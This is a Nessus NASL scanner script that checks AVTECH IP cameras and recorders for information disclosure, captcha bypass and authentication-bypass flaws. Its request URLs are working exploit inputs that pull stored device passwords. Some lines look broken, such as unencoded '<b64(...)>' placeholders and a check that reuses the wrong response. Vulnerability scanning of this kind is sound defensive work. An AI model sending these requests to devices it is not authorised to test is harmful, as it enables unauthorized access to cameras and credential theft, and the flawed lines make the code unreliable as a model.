###############################################################################
# Nessus Vulnerability Test
#
###############################################################################

if(description)
{
  script_id(51799023);
  #script_oid("1.3.6.1.4.1.25623.1.0.17282999");
  script_version("$Revision: 10852 $");
  #script_name("Multiple AVTECH vulnerability");
  script_name(english:"Multiple AVTECH vulnerability");
  
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 WEBRAY");
  script_family(english:"Camera");
  script_dependencies( "http_version.nasl");
  #script_require_ports("Services/http","Services/https",80);
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_require_ports("Services/www", 80);
  #script_xref(name:"URL", value:"https://packetstormsecurity.com/files/139077/Avtech-IP-Camera-NVR-DVR-CSRF-Disclosure-Command-Injection.html");
  script_set_attribute(attribute:"see_also", value:"https://packetstormsecurity.com/files/139077/Avtech-IP-Camera-NVR-DVR-CSRF-Disclosure-Command-Injection.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to new version.");
  #script_description("Detect the vulnerabilities of the AVTECH.");
  script_set_attribute(
    attribute:"description",
    value:"Detect the vulnerabilities of the AVTECH.");
  exit(0);
}
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("webapp_func.inc");

port=get_http_port(default:80);
#display("port=="+port);
 url="/cgi-bin/nobody/Machine.cgi?action=get_capability"; url1="/cgi-bin/nobody/VerifyCode.cgi?account=YWFhOmFhYQ==&captcha_code=aaaa&verify_code=67qWtdeIIBIxE"; url2="/cgi-bin/nobody/VerifyCode.cgi?account=<b64(77aabbb88:ZVmHTLN5eiGB)>&login=quick";
 url3="/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*";
 url4="/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"; url5="/cgi-bin/nobody/VerifyCode.cgi?account=<b64(admin:admin)>&captcha_code=ZVFU&verify_code=ZVmHTLN5eiGB";
 req = http_get(item:url, port:port); 
 req1 = http_get(item:url1, port:port);  
 req2 = http_get(item:url2, port:port); 
 req3 = http_get(item:url3, port:port); 
 req4 = http_get(item:url4, port:port); 
 req5 = http_get(item:url5, port:port); 
 
 res = http_keepalive_send_recv(port:port, data:req);
 res1 = http_keepalive_send_recv(port:port, data:req1); 
 res2 = http_keepalive_send_recv(port:port, data:req2);
 res3 = http_keepalive_send_recv(port:port, data:req3);
 res4 = http_keepalive_send_recv(port:port, data:req4);
 res5 = http_keepalive_send_recv(port:port, data:req5);

 if("Product.Type"><res&&"Product.ID"><res){
	if (report_verbosity > 0)
	{
	  header = 'verify Information disclosure vulnerability with the following URL';
	  report = get_vuln_report(
		items  : url,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req+res);
			  else security_hole(port);
 } 
 if("Verify Code is incorrect"><res1&&"Authentication error"><res2){
	if (report_verbosity > 0)
	{
	  header = 'verify Login captcha bypass with the following URL';
	  report = get_vuln_report(
		items  : url2,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req2+res2);
			  else security_hole(port);
 }
 if("Account.LocalPassword"><res3&&"Account.OperatorPassword"><res3){
	if (report_verbosity > 0)
	{
	  header = 'verify Authentication bypasses obtaining device password with the following URL';
	  report = get_vuln_report(
		items  : url3,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req3+res3);
			  else security_hole(port);
 }
 if("Account.User1.Password"><res4||"Account.User2.Password"><res4){
	if (report_verbosity > 0)
	{
	  header = 'verify Authentication bypasses obtaining device password2 with the following URL';
	  report = get_vuln_report(
		items  : url4,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req4+res4);
			  else security_hole(port);
 }
 if("Verify Code is incorrect"><res1&&"Authentication error"><res5){
	if (report_verbosity > 0)
	{
	  header = 'verify Login captcha bypass with the following URL';
	  report = get_vuln_report(
		items  : url5,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req5+res5);
			  else security_hole(port);
 }



exit(0);
